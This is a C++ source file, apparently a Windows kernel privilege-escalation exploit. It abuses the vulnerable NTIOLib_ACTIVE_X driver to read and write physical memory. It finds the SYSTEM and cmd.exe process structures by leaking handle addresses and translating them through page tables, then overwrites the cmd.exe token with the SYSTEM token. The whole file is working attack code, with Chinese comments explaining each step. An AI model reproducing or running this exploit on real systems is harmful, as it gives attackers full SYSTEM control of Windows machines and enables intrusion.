#include <windows.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <iostream>
#include <unordered_map>
#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#pragma comment(lib, "wbemuuid.lib")
// #define EPROCESS_IAMGE_NAME_OFFSET 0x5A8
#define SYSTEM_IMAGE_NAME_OFFSET 0x5E4 // 0x3C+0x5A8
#define CMD_IMAGE_NAME_OFFSET 0x624 // 0x7C+0x5A8
#define SYSTEM_TOKEN_OFFSET 0x4F4 // 0x3C+0x4B8
#define CMD_TOKNE_OFFSET 0x534 // 0x7C+0x4B8
#define SYSTEM_IMAGE_NAME "SYSTEM"
#define CMD_IMAGE_NAME "cmd.exe"
#define STEP 0x1000
#ifndef max
#define max(a,b)            (((a) > (b)) ? (a) : (b))
#endif
bool IsValidKernelAddressFormat(PVOID Address);
#define b8 DWORD64
#define b4 DWORD
#define b2 WORD
#define b1 UCHAR 
DWORD64 q(PBYTE a1) { return *(DWORD64*)(a1); }
DWORD d(PBYTE a1) { return *(DWORD*)(a1); }
WORD w(PBYTE a1) { return *(WORD*)(a1); }
UCHAR b(PBYTE a1) { return *(PBYTE)(a1); }
b1* GMemBuffer;
b8 v2P(HANDLE hDevice, b8 cr3, b4 size);
#include <stdint.h>
b8 GcmdET;
b8 GsysEP;
// Structure to hold the parsed address components
typedef struct {
	uint16_t sign;
	uint16_t pml4;
	uint16_t pdpt;
	uint16_t pd;
	uint16_t pt;
	uint16_t offset;
} VirtualAddressComponents;
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

#define SystemHandleInformation 0x10
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

typedef struct _SYSTEM_HANDLE {
	ULONG       ProcessId;
	BYTE        ObjectTypeNumber;
	BYTE        Flags;
	USHORT      Handle;
	PVOID       Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1]; // Variable-length array
} SYSTEM_HANDLE_INFORMATION;

b8 getEPForSys() {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll) {
		// printf("Failed to load ntdll.dll\n");
		return 1;
	}

	NtQuerySystemInformation_t NtQuerySystemInformation =
		(NtQuerySystemInformation_t)GetProcAddress(ntdll, "NtQuerySystemInformation");

	if (!NtQuerySystemInformation) {
		// printf("Failed to get NtQuerySystemInformation address\n");
		return 1;
	}

	ULONG bufferSize = 0x10000;
	PVOID buffer = NULL;
	ULONG returnLength = 0;
	NTSTATUS status;

	do {
		if (buffer) free(buffer);
		buffer = malloc(bufferSize);
		if (!buffer) {
			// printf("Memory allocation failed\n");
			return 1;
		}

		status = NtQuerySystemInformation(SystemHandleInformation, buffer, bufferSize, &returnLength);
		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			bufferSize *= 2;
		}

	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (status != 0) {
		// printf("NtQuerySystemInformation failed: 0x%08X\n", status);
		free(buffer);
		return 1;
	}

	SYSTEM_HANDLE_INFORMATION* handleInfo = (SYSTEM_HANDLE_INFORMATION*)buffer;
	// printf("Number of handles: %lu\n", handleInfo->HandleCount);

	for (ULONG i = 0; i < handleInfo->HandleCount; i++) {
		SYSTEM_HANDLE h = handleInfo->Handles[i];
		if (h.Handle==4 && h.ObjectTypeNumber==7 && h.ProcessId == 4) {

		 printf("PID: %5lu  Handle: 0x%04X  ObjectType: %-3u  Access: 0x%08X\n",
			h.ProcessId, h.Handle, h.ObjectTypeNumber, h.GrantedAccess);
			// printf("object address: 0x%p\n", h.Object);	
			free(buffer);
			return (b8)(h.Object);
		}
	}

	free(buffer);
	return 0;
}
b8 getEPForCmd(b8 targetcmdpid) {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll) {
		// printf("Failed to load ntdll.dll\n");
		return 1;
	}

	NtQuerySystemInformation_t NtQuerySystemInformation =
		(NtQuerySystemInformation_t)GetProcAddress(ntdll, "NtQuerySystemInformation");

	if (!NtQuerySystemInformation) {
		// printf("Failed to get NtQuerySystemInformation address\n");
		return 1;
	}

	ULONG bufferSize = 0x10000;
	PVOID buffer = NULL;
	ULONG returnLength = 0;
	NTSTATUS status;

	do {
		if (buffer) free(buffer);
		buffer = malloc(bufferSize);
		if (!buffer) {
			// printf("Memory allocation failed\n");
			return 1;
		}

		status = NtQuerySystemInformation(SystemHandleInformation, buffer, bufferSize, &returnLength);
		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			bufferSize *= 2;
		}

	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (status != 0) {
		// printf("NtQuerySystemInformation failed: 0x%08X\n", status);
		free(buffer);
		return 1;
	}

	SYSTEM_HANDLE_INFORMATION* handleInfo = (SYSTEM_HANDLE_INFORMATION*)buffer;
	// printf("Number of handles: %lu\n", handleInfo->HandleCount);

	for (ULONG i = 0; i < handleInfo->HandleCount; i++) {
		SYSTEM_HANDLE h = handleInfo->Handles[i];
		if (h.ObjectTypeNumber == 8 && h.ProcessId == targetcmdpid) {

		 printf("PID: %5lu  Handle: 0x%04X  ObjectType: %-3u  Access: 0x%08X\n",
			h.ProcessId, h.Handle, h.ObjectTypeNumber, h.GrantedAccess);
			// printf("object address: 0x%p\n", h.Object);	
			free(buffer);
			return (b8)(h.Object);
		}
	}

	free(buffer);
	return 0;
}
VirtualAddressComponents parse_virtual_address(const char* addr_str) {
	uint64_t addr =(uint64_t) addr_str;

	VirtualAddressComponents result;

	result.offset = addr & 0xFFF;
	result.pt = (addr >> 12) & 0x1FF;
	result.pd = (addr >> 21) & 0x1FF;
	result.pdpt = (addr >> 30) & 0x1FF;
	result.pml4 = (addr >> 39) & 0x1FF;
	result.sign = (addr >> 48) & 0xFFFF;

	return result;
}

b8 v2PForCmd(HANDLE hDevice, b8 cr3, b4 size);
b8 v2PDebug(HANDLE hDevice, b8 cr3, b4 size);
b8 ETCheck(HANDLE hDev, b8 ETPh,b8 cr3);
b8 commonV2P(HANDLE hDev, b8 v,b8 cr3);
void getHardwareMappings(std::unordered_map<uint64_t, uint64_t>& hardwareMappings)
{
	if (FAILED(CoInitializeEx(0, COINIT_MULTITHREADED)))
	{
		return;
	}

	if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL)))
	{
		CoUninitialize();
		return;
	}

	IWbemLocator *pLoc = NULL;
	if (FAILED(CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc)))
	{
		CoUninitialize();
		return;
	}

	IWbemServices *pSvc = NULL;
	if (FAILED(pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc)))
	{
		pLoc->Release();
		CoUninitialize();
		return;
	}

	if (FAILED(CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE)))
	{
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return;
	}

	IEnumWbemClassObject* pEnumerator = NULL;
	if (FAILED(pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT * FROM Win32_DeviceMemoryAddress"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator)))
	{
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return;
	}

	std::vector<std::pair<uint64_t, uint64_t>> ranges;
	IWbemClassObject *pclsObj = NULL;
	ULONG uReturn = 0;
	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
		if (0 == uReturn)
		{
			break;
		}

		VARIANT vtProp;
		pclsObj->Get(L"StartingAddress", 0, &vtProp, 0, 0);
		uint64_t startAddr = 0;
		swscanf_s(vtProp.bstrVal, L"%lld", &startAddr);
		VariantClear(&vtProp);

		pclsObj->Get(L"EndingAddress", 0, &vtProp, 0, 0);
		uint64_t endAddr = 0;
		swscanf_s(vtProp.bstrVal, L"%lld", &endAddr);
		VariantClear(&vtProp);

		pclsObj->Release();
		ranges.push_back(std::pair<uint64_t, uint64_t>(startAddr, endAddr + 1));
		//// // printf("%0I64X %0I64X\n", startAddr, endAddr);
	}
	//insert dummy range <0xF0000000, 0xFFFFFFFF>
	ranges.push_back(std::pair<uint64_t, uint64_t>(0xF0000000LL, 0x100000000LL));

	std::sort(ranges.begin(), ranges.end());
	auto it = ranges.begin();
	std::pair<uint64_t, uint64_t> current = *(it)++;
	while (it != ranges.end())
	{
		if (current.second >= it->first)
		{
			current.second = max(current.second, it->second);
		}
		else
		{
			hardwareMappings[current.first] = current.second - current.first;
			current = *(it);
		}
		it++;
	}
	hardwareMappings[current.first] = current.second - current.first;

	pSvc->Release();
	pLoc->Release();
	pEnumerator->Release();
	CoUninitialize();
}
bool writePhMem(HANDLE hDevice, b8 destPhAddr, b8 b8Value);
HANDLE getDriverHandle();
b8 elevatePriv(HANDLE hDev, std::unordered_map<uint64_t, uint64_t> hwHole);

bool mapPhMem(HANDLE hDevice, b8 phStart, b4 size);
int main(int argc,char* argv[]) {
	b8 cmdET=getEPForCmd( atoi(argv[1]));
	if (!cmdET) {
		printf("can not locate target cmd ethread addr, press any key to exit\n");
		system("pause");
		exit(-1);
	}
	b8 sysEP= getEPForSys();
	if (!sysEP) {
		printf("can not locate system eprocess addr, press any key to exit\n");
		system("pause");
		exit(-1);
	}
 GcmdET = cmdET;
 GsysEP = sysEP;
	HANDLE hDevice = getDriverHandle();
	// Output buffer 1KB
	LPVOID OutBuffer = VirtualAlloc(
		nullptr,
		STEP,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (!OutBuffer) {
		std::cout << "\n[!] Failed to allocate output buffer.\n";
		CloseHandle(hDevice);

	}
	GMemBuffer = (b1*)OutBuffer;

	std::unordered_map<uint64_t, uint64_t> mapping;
	// 枚举出来所有的设备内存范围，不然读取到这些内存地址会直接导致蓝屏
	getHardwareMappings(mapping);
	for (const auto& pair : mapping) {
		// // printf("0x%p -> 0x%p\n\n", pair.first, pair.second);
	}
	
	// 然后就可以和驱动交互来读写内存了
	// // printf("trying to elvate my privilege\n");
	elevatePriv(hDevice, mapping);
	return 0;
}
b8 elevatePriv(HANDLE hDev, std::unordered_map<uint64_t, uint64_t> hwHole) {

	b8 systemToken = 0;
	b8 cmdTokenPhAddr = 0;
	// 基本思想就是扫描整块物理内存，来定位系统进程的EPROCESS
	// 但是我们要调过硬件内存区域
	b8 phMemSize;
	// 获取系统上安装的物理内存的大小 单位是kb 1024bytes
	GetPhysicallyInstalledSystemMemory(&phMemSize);
	// 那么物理内存地址的最大值应该是
	// 每次读取一个内存页 4kb
	b4 step = STEP;
	b8 cr3 = 0;
	b8 sysEpPhAddr = 0;
	for (b8 i = 0x1; i < 0xfffff; i++) {
		cr3 = i * 0x1000;
		// 尝试翻译虚拟地址
	//	printf("locating sys: 0x%x\n", i);
		sysEpPhAddr = v2P(hDev, cr3, 8);
		if (sysEpPhAddr) // 我们只需要读一个DWORD64
		{
			break;
		}
		//v2PDebug(hDev, cr3, 8); // 我们只需要读一个DWORD64
		
	}
	// 获取到system EP的物理地址   后面还有问题需要解决， 如何利用对system eprocess的任意读写来进行权限的提升呢？
	if (!sysEpPhAddr) {
	 printf("can not locate cr3 value of System process, press any key to exit\n");
		 system("pause");
		exit(-1);
	} 
		b8 cmdEpPhAddr = 0;
	//for (b8 i = 0x1; i < 0xfffff; i++) {
	//	cr3 = i * 0x1000;
		// 尝试翻译虚拟地址
		 
		// printf("locating cmd: 0x%x\n", i);
		cmdEpPhAddr = v2PForCmd(hDev, cr3, 8);
	// 	if (cmdEpPhAddr) // 我们只需要读一个DWORD64
	// 	{
	// 		break;
	// 	}
	// 	//v2PDebug(hDev, cr3, 8); // 我们只需要读一个DWORD64
	// 
	// }
	if (!cmdEpPhAddr) {
  printf("can not locate cr3 value of target cmd process, press any key to exit\n");
		system("pause");
		exit(-1);
	}
	printf("sys phep: 0x%p, cmd phep: 0x%p\n", sysEpPhAddr, cmdEpPhAddr);
 
	// 现在两个进程的phEP我们都有了，只需要从前者读出来token写给后者即可   +0x358 Token    
	mapPhMem(hDev, sysEpPhAddr + 0x358, 8);
	b8 sysToken = *(b8*)GMemBuffer;
	writePhMem(hDev, cmdEpPhAddr + 0x358, sysToken);
	return 0;
}
bool writePhMem(HANDLE hDevice, b8 destPhAddr, b8 b8Value) {
	unsigned char InBuffer[0x18] = { 0 };
	*(reinterpret_cast<INT64*>(&InBuffer[0])) = destPhAddr;
	*(reinterpret_cast<INT64*>(&InBuffer[0x10])) = b8Value;
	*(reinterpret_cast<INT32*>(&InBuffer[0xc])) = 8;
	*(reinterpret_cast<INT32*>(&InBuffer[0x8])) = 1;



	// Ptr receiving output byte count
	DWORD BytesReturned = 0;


	BOOL CallResult = DeviceIoControl(
		hDevice,
		0xC350A108,
		InBuffer,
		sizeof(InBuffer),
		GMemBuffer, // outbuffer随便填，因为根本就用不到
		8,
		&BytesReturned,
		nullptr
	);

	if (!CallResult) {
		std::cout << "\n[!] DeviceIoControl failed..\n";
		// // printf("error code: 0x%x\n", GetLastError());
		return 0;
		CloseHandle(hDevice);

	}
	return 1;
}
HANDLE getDriverHandle() {
	HANDLE hDevice = CreateFileA(
		"\\\\.\\NTIOLib_ACTIVE_X",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		nullptr
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "\n[!] Unable to get driver handle..\n";
		// // printf("error code: 0x%x\n", GetLastError());
		return 0;
	}
	else {
		std::cout << "\n[>] Driver access OK..\n";
		std::cout << "[+] lpFileName: \\\\.\\NTIOLib_ACTIVE_X => ntiolib_x64\n";
		std::cout << "[+] Handle: " << hDevice << "\n";
	}
	return hDevice;
}
bool mapPhMem(HANDLE hDevice, b8 phStart, b4 size) {
	/*char tempbuf[0x200] = { 0 };
	  sprintf(tempbuf,"mapPhMem with phstart: 0x%p\n", phStart);
	  OutputDebugStringA(tempbuf);*/
	unsigned char InBuffer[0x10] = { 0 };
	// inBuffer的0x8存一个b4，值为1，指示驱动将映射出来的物理内存拷贝到我们传过去的buffer中
	// outBuffer将存储映射出来的物理内存
	// inBuffer的0xC存一个b4作为要映射的size
	// inBuffer的0存一个b8，作为物理内存的开始地址
	*(reinterpret_cast<INT64*>(&InBuffer[0])) = phStart;
	*(reinterpret_cast<INT64*>(&InBuffer[8])) = 1;
	*(reinterpret_cast<INT64*>(&InBuffer[0xc])) = size;



	// Ptr receiving output byte count
	DWORD BytesReturned = 0;


	BOOL CallResult = DeviceIoControl(
		hDevice,
		0xC3506104,
		InBuffer,
		sizeof(InBuffer),
		GMemBuffer,
		size,
		&BytesReturned,
		nullptr
	);

	if (!CallResult) {
		std::cout << "\n[!] DeviceIoControl failed..\n";
		// // printf("error code: 0x%x\n", GetLastError());
		return 0;
		CloseHandle(hDevice);

	}
	// // printf("bytes count read out: 0x%x\n", BytesReturned);
	return 1;
}
 

	b8 v2P(HANDLE hDevice, b8 cr3, b4 size) {
		// System进程的EP分解结果
/*
PML4 Index     : 0x1b6
PDPT Index     : 0x020
PD Index       : 0x04b
PT Index       : 0x094
Offset         : 0x040
	*/
	// !dq cr3  +190*8 l1
	// cr3 = 0x100000; 
		b8 SystemEPVaddr = GsysEP;
 
		VirtualAddressComponents parsed = parse_virtual_address((char*)SystemEPVaddr);
		b4 PML4 = parsed.pml4;
		b4 PDPT = parsed.pdpt;
		b4 PD = parsed.pd;
		b4 PT = parsed.pt;
		b4 Offset = parsed.offset;
 
		// !dq cr3  +190*8 l1
		// cr3 = 0x100000;
		 
		// // printf("\n\n========================\try cr3========================\n\n: 0x%p\n", cr3);
		b8 _ = cr3 + PML4 * 8;
		// 获取PML4E中的值

		if (mapPhMem(hDevice, _, size)) {
			// 获取
			_ = *(b8*)(GMemBuffer);
			_ = _ & 0xFFFFF000;
			_ = _ + PDPT * 8;
			if (mapPhMem(hDevice, _, size)) {  // PDE
				_ = *(b8*)(GMemBuffer);
				_ = _ & 0xFFFFF000;
				_ = _ + PD * 8;
				if (mapPhMem(hDevice, _, size)) {
					_ = *(b8*)(GMemBuffer);  // 检查PAT标志位
					if (0x80 & _) {
						// 启用large page  不存在PT了
						_ = _ & 0xFFFFF000;
						_ = _ + (SystemEPVaddr & 0x1FFFFF);
						b8 phEP = _;
						if (mapPhMem(hDevice, phEP + 0x450, 6)) {
							if (*(b4*)(GMemBuffer) == 0x74737953 && *(b2*)(GMemBuffer + 4) == 0x6d65) {
							  printf("get right cr3: 0x%p\n", cr3);
							 printf("ph addr of system ep: 0x%p\n", phEP);
							 
								return phEP;
							}
						}
						return 0;
					}
					_ = _ & 0xFFFFF000;
					_ = _ + PT * 8;
					if (mapPhMem(hDevice, _, size)) {
						_ = *(b8*)(GMemBuffer);
						_ = _ & 0xFFFFF000;
						// 最终的物理地址 也是System EP的起始地址
						_ = _ + Offset;
						// win10 1709的ImageFileName偏移是0x450
						b8 phEP = _;
						if (mapPhMem(hDevice, phEP + 0x450, 6)) {
							if (*(b4*)(GMemBuffer) == 0x74737953 && *(b2*)(GMemBuffer + 4) == 0x6d65) {
								  printf("get right cr3: 0x%p\n", cr3);
						 printf("ph addr of system ep: 0x%p\n", phEP);
						 
								return phEP;
							}
						}
					}
				}
			}
		}
		return 0;
	}

	

	b8 v2PForCmd(HANDLE hDevice, b8 cr3, b4 size) {
		// 之前获取到的线程虚拟地址的分解结果
		/*
PML4 Index     : 0x1b6
PDPT Index     : 0x020
PD Index       : 0x061
PT Index       : 0x07d
Offset         : 0x080
			*/	 
		b8 SystemEPVaddr = GcmdET;

		VirtualAddressComponents parsed = parse_virtual_address((char*)SystemEPVaddr);
		b4 PML4 = parsed.pml4;
		b4 PDPT = parsed.pdpt;
		b4 PD = parsed.pd;
		b4 PT = parsed.pt;
		b4 Offset = parsed.offset;
 
		// !dq cr3  +190*8 l1
		// cr3 = 0x100000;

		// // printf("\n\n========================\try cr3========================\n\n: 0x%p\n", cr3);
		b8 _ = cr3 + PML4 * 8;
		// 获取PML4E中的值

		if (mapPhMem(hDevice, _, size)) {
			// 获取
			_ = *(b8*)(GMemBuffer);
			_ = _ & 0xFFFFF000;
			_ = _ + PDPT * 8;
			if (mapPhMem(hDevice, _, size)) {  // PDE
				_ = *(b8*)(GMemBuffer);
				_ = _ & 0xFFFFF000;
				_ = _ + PD * 8;
				if (mapPhMem(hDevice, _, size)) {
					_ = *(b8*)(GMemBuffer);  // 检查PAT标志位
					if (0x80 & _) {
						// 启用large page  不存在PT了
						_ = _ & 0xFFFFF000;
						_ = _ + (SystemEPVaddr & 0x1FFFFF);
						b8 phEP = _;
						b8 targetCmdpEP = ETCheck(hDevice, phEP,cr3);
						if (!targetCmdpEP)
							return 0;
						else {

						 printf("get right cr3: 0x%p\n", cr3);
						 printf("ph addr of target cmd.exe ep: 0x%p\n", targetCmdpEP);
						 
							return targetCmdpEP;

						}
					}
					_ = _ & 0xFFFFF000;
					_ = _ + PT * 8;
					if (mapPhMem(hDevice, _, size)) {
						_ = *(b8*)(GMemBuffer);
						_ = _ & 0xFFFFF000;
						// 最终的物理地址 也是System EP的起始地址
						_ = _ + Offset;
						// win10 1709的ImageFileName偏移是0x450
						b8 phEP = _;
						b8 targetCmdpEP = ETCheck(hDevice, phEP,cr3);
						if (!targetCmdpEP)
							return 0;
						else {

						  printf("get right cr3: 0x%p\n", cr3);
						  printf("ph addr of target cmd.exe ep: 0x%p\n", targetCmdpEP);
							 
							return targetCmdpEP;

						}
					}
				}
			}
		}
		return 0;
	}
 
b8 ETCheck(HANDLE hDev, b8 ETPh,b8 cr3) {
	// 拿到et的物理地址后，需要读取 +0x098 ApcState
	mapPhMem(hDev, ETPh + 0x98+0x20, 8);
	b8 vEP = *(b8*)(GMemBuffer);
	printf("target eprocess virtual addr: 0x%p\n", vEP);
	if (!IsValidKernelAddressFormat((PVOID)vEP))
		return 0;
	 // 我们这里要检查一下这个虚拟地址是不是一个合法的虚拟地址结构
	b8 pEP = commonV2P(hDev, vEP,cr3);
	 
	// 读取  +0x450 ImageFileName 
 mapPhMem(hDev, pEP + 0x450, 7);
 if (*(b4*)(GMemBuffer) == 0x2e646d63 && *(b2*)(GMemBuffer + 4) == 0x7865 && *(b1*)(GMemBuffer + 6) == 0x65) {
	 return pEP;
 }
 return 0;
}
bool IsValidKernelAddressFormat(PVOID Address)
{
	UINT64 addr = (UINT64)Address;

	// Kernel virtual addresses must be in this canonical range:
	// 0xFFFF800000000000 - 0xFFFFFFFFFFFFFFFF
	return (addr >= 0xFFFF800000000000ULL && addr <= 0xFFFFFFFFFFFFFFFFULL);
}
b8 commonV2P(HANDLE hDevice, b8 v,b8 cr3) {
	int size = 8;
	b8 SystemEPVaddr = v;
	VirtualAddressComponents parsed = parse_virtual_address((char*)SystemEPVaddr);
	b4 PML4 = parsed.pml4;
	b4 PDPT = parsed.pdpt;
	b4 PD = parsed.pd;
	b4 PT = parsed.pt;
	b4 Offset = parsed.offset;
	// !dq cr3  +190*8 l1
	// cr3 = 0x100000;

	// // printf("\n\n========================\try cr3========================\n\n: 0x%p\n", cr3);
	b8 _ = cr3 + PML4 * 8;
	// 获取PML4E中的值

	if (mapPhMem(hDevice, _, size)) {
		// 获取
		_ = *(b8*)(GMemBuffer);
		_ = _ & 0xFFFFF000;
		_ = _ + PDPT * 8;
		if (mapPhMem(hDevice, _, size)) {  // PDE
			_ = *(b8*)(GMemBuffer);
			_ = _ & 0xFFFFF000;
			_ = _ + PD * 8;
			if (mapPhMem(hDevice, _, size)) {
				_ = *(b8*)(GMemBuffer);  // 检查PAT标志位
				if (0x80 & _) {
					// 启用large page  不存在PT了
					_ = _ & 0xFFFFF000;
					_ = _ + (SystemEPVaddr & 0x1FFFFF);
					b8 phEP = _;
					return phEP;
					
				}
				_ = _ & 0xFFFFF000;
				_ = _ + PT * 8;
				if (mapPhMem(hDevice, _, size)) {
					_ = *(b8*)(GMemBuffer);
					_ = _ & 0xFFFFF000;
					// 最终的物理地址 也是System EP的起始地址
					_ = _ + Offset;
					// win10 1709的ImageFileName偏移是0x450
					b8 phEP = _;
					return phEP;
					if (mapPhMem(hDevice, phEP + 0x450, 6)) {
						if (*(b4*)(GMemBuffer) == 0x74737953 && *(b2*)(GMemBuffer + 4) == 0x6d65) {
							// // printf("get right cr3: 0x%p\n", cr3);
							// // printf("ph addr of system ep: 0x%p\n", phEP);
							system("pause");
						}
					}
				}
			}
		}
	}
	return 0;
}
	b8 v2PDebug(HANDLE hDevice, b8 cr3, b4 size) {
		// System进程的EP分解结果
		/*
	PML4   Index     : 0x190
	PDPT   Index     : 0x009
	PD     Index       : 0x070
	PT     Index       : 0x094
	Offset         : 0x040
			*/
		b8 SystemEPVaddr = 0xffffc8024e094040;
		b4 PML4 = 0x190;
		b4 PDPT = 0x009;
		b4 PD = 0x070;
		b4 PT = 0x094;
		b4 Offset = 0x040;
		// !dq cr3  +190*8 l1
		// cr3 = 0x100000;
		if (cr3 == 0x1ab000)
			system("pause");
		// // printf("\n\n========================\try cr3========================\n\n: 0x%p\n", cr3);
		b8 _ = cr3 + PML4 * 8;
		// 获取PML4E中的值

		if (mapPhMem(hDevice, _, size)) {
			// 获取
			_ = *(b8*)(GMemBuffer);
			_ = _ & 0xFFFFF000;
			_ = _ + PDPT * 8;
			if (mapPhMem(hDevice, _, size)) {  // PDE
				_ = *(b8*)(GMemBuffer);
				_ = _ & 0xFFFFF000;
				_ = _ + PD * 8;
				if (mapPhMem(hDevice, _, size)) {
					_ = *(b8*)(GMemBuffer);  // 检查PAT标志位
					if (0x80 & _) {
						// 启用large page  不存在PT了
						_ = _ & 0xFFFFF000;
						_ = _ + (SystemEPVaddr & 0x1FFFFF);
						b8 phEP = _;
						if (mapPhMem(hDevice, phEP + 0x450, 6)) {
							if (*(b4*)(GMemBuffer) == 0x74737953 && *(b2*)(GMemBuffer + 4) == 0x6d65) {
								// // printf("get right cr3: 0x%p\n", cr3);
								// // printf("ph addr of system ep: 0x%p\n", phEP);
								system("pause");
							}
						}
						return 0;
					}
					_ = _ & 0xFFFFF000;
					_ = _ + PT * 8;
					if (mapPhMem(hDevice, _, size)) {
						_ = *(b8*)(GMemBuffer);
						_ = _ & 0xFFFFF000;
						// 最终的物理地址 也是System EP的起始地址
						_ = _ + Offset;
						// win10 1709的ImageFileName偏移是0x450
						b8 phEP = _;
						if (mapPhMem(hDevice, phEP + 0x450, 6)) {
							if (*(b4*)(GMemBuffer) == 0x74737953 && *(b2*)(GMemBuffer + 4) == 0x6d65) {
								// // printf("get right cr3: 0x%p\n", cr3);
								// // printf("ph addr of system ep: 0x%p\n", phEP);
								system("pause");
							}
						}
					}
				}
			}
		}
		return 0;
	}
